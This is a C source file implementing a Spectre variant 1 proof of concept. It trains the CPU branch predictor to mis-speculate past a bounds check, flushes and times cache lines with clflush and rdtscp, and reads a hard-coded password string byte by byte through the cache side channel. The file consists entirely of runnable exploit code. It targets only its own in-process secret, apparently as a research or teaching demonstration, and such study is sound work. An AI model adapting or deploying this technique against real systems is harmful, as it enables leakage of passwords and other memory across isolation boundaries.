#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <x86intrin.h>

// Victim's data structures
unsigned int array1_size = 16;
uint8_t unused1[64];  // Padding to avoid prefetch effects
uint8_t array1[160] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16};
uint8_t unused2[64];  // Padding to avoid prefetch effects
uint8_t array2[256 * 512];

const char *secret = "The password is: SuperSecret123";

uint8_t temp = 0;  // Used to prevent optimization

void victim_function(size_t x) {
    if (x < array1_size) {
        temp &= array2[array1[x] * 512];
    }
}

#define CACHE_HIT_THRESHOLD 80
#define TRAINING_ROUNDS 1000

void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
    static int results[256];
    int tries, i, j, k, mix_i, junk = 0;
    size_t training_x, x;
    volatile uint8_t *addr;

    for (i = 0; i < 256; i++)
        results[i] = 0;

    for (tries = TRAINING_ROUNDS; tries > 0; tries--) {
        /* Flush array2[256*(0..255)] from cache */
        for (i = 0; i < 256; i++)
            _mm_clflush(&array2[i * 512]);

        /* Train the branch predictor */
        training_x = tries % array1_size;
        for (j = 29; j >= 0; j--) {
            _mm_clflush(&array1_size);
            for (volatile int z = 0; z < 100; z++) {} // Delay

            // Bit twiddling to avoid jumps
            x = ((j % 6) - 1) & ~0xFFFF;
            x = (x | (x >> 16));
            x = training_x ^ (x & (malicious_x ^ training_x));

            victim_function(x);
        }

        /* Time reads. Order mixed up to prevent stride prediction */
        for (i = 0; i < 256; i++) {
            mix_i = ((i * 167) + 13) & 255;
            addr = &array2[mix_i * 512];

            unsigned int junk2;
            uint64_t time1 = __rdtscp(&junk2);
            junk = *addr;
            uint64_t time2 = __rdtscp(&junk2) - time1;

            if (time2 <= CACHE_HIT_THRESHOLD && mix_i != array1[tries % array1_size])
                results[mix_i]++;
        }

        /* Find highest & second-highest results */
        j = k = -1;
        for (i = 0; i < 256; i++) {
            if (j < 0 || results[i] >= results[j]) {
                k = j;
                j = i;
            } else if (k < 0 || results[i] >= results[k]) {
                k = i;
            }
        }

        if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0))
            break;  // Success if best is > 2*runner-up + 5 or 2/0
    }

    value[0] = (uint8_t)j;
    score[0] = results[j];
    value[1] = (uint8_t)k;
    score[1] = results[k];
}

int main(void) {
    printf("Cached Threshold: %d\n", CACHE_HIT_THRESHOLD);

    // Initialize array2 to prevent copy-on-write
    for (size_t i = 0; i < sizeof(array2); i++)
        array2[i] = 1;

    printf("Reading %zu bytes:\n", strlen(secret));
    size_t malicious_x = (size_t)(secret - (char *)array1);

    while (malicious_x < (size_t)(secret - (char *)array1 + strlen(secret))) {
        uint8_t value[2];
        int score[2];

        readMemoryByte(malicious_x++, value, score);

        printf("Reading at malicious_x = %p: ", (void *)malicious_x);
        printf("%s: 0x%02X='%c' score=%d ",
            score[0] >= 2 * score[1] ? "Success" : "Unclear",
            value[0],
            (value[0] > 31 && value[0] < 127 ? value[0] : '?'),
            score[0]);

        if (score[1] > 0)
            printf("(second best: 0x%02X score=%d)", value[1], score[1]);
        printf("\n");
    }
    return 0;
}
